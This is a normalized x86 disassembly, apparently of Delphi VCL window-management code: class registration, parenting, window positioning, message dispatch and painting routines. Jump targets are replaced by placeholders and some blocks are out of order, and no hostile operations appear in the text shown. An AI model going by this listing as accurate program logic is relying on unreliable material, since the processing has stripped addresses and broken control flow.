mov esi eax
xor eax eax
push ebp
push sub_43dd02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b98
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43db7c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_440d58
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030e8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40414c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40875c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dd09
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_43dd10
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43ded1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_437310
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_437310
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40ce50
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40ce50
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408910
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_441068
push 0x1
mov eax [ esi + 0x68 ]
call sub_41ce38
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43b724
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_440d58
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ded8
lea eax [ ebp - 0xc0 ]
call sub_403ee8
retn
mov eax esi
mov si 0xffee
call sub_403394
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_43dee0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406a28
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_43df20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417ee0
mov eax esi
call sub_417e30
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417e30
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417ee8
pop esi
pop ebx
retn
sub_43df58
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41972c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_4196b8
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_4196b8
mov eax esi
call sub_419734
add esp 0x10
pop esi
pop ebx
retn
sub_43dfc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_43dfac
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_414098
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414098
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_43e098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43ba5c
mov eax [ ebp - 0x8 ]
push eax
push sub_43df20
mov eax [ ebp - 0x8 ]
push eax
push sub_43df58
push ebp
call sub_43dfc0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e0f3
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_43a4e4
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4088c4
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4088d8
mov ecx eax
mov edx edi
mov eax ebx
call sub_43a4f4
mov eax r-xdata
call sub_4088e4
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_438f98
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_43e14c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_43e199
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e1a0
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40ce50
sub_43e1b0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4140f4
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_414098
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_43e1f8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_43e1b0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43da4c
call sub_439bc4
inc edi
dec esi
jne r-xdata
sub_43e294
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_43e2b0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_414098
call sub_43e2b0
inc edi
dec esi
jne r-xdata
sub_43e310
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403394
mov ebx eax
mov eax edi
call sub_43e2b0
mov eax edi
call sub_43e44c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_43e350
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43e426
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43b724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414098
call sub_43e350
inc esi
dec ebx
jne r-xdata
sub_43e44c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43e350
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43e48c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_43e2b0
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_43e44c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406a18
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43b724
jmp r-xdata
sub_43e514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403638#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43e55b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e562
call sub_438f98
call sub_42111c
retn
sub_43e58c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412bb8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406a00
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43b724
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43e644
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_414098
call sub_43e58c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_414098
call sub_43e58c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_43e6d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_440d58
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069ec
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43e644
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a00
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43b724
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_43e76c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43ace0
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43b7f0
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43e6d8
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069ec
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43a0b4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43e644
test eax eax
je r-xdata
mov eax ebx
call sub_451710
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43b7f0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_440d58
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_440d58
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43b724
sub_43e8d0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43b984
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43b724
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41d610
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41d64c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43a110
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_43e9d8
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_4373fc
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43b724
mov [ esi + 0xc ] eax
mov bl 0x1
sub_43ea0c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_43eb2c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43eb64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eb33
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_414098
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43eb64
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4140f4
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_414098
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412be0
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_414098
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c964
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412be0
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c964
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412be0
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_438eac
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43b724
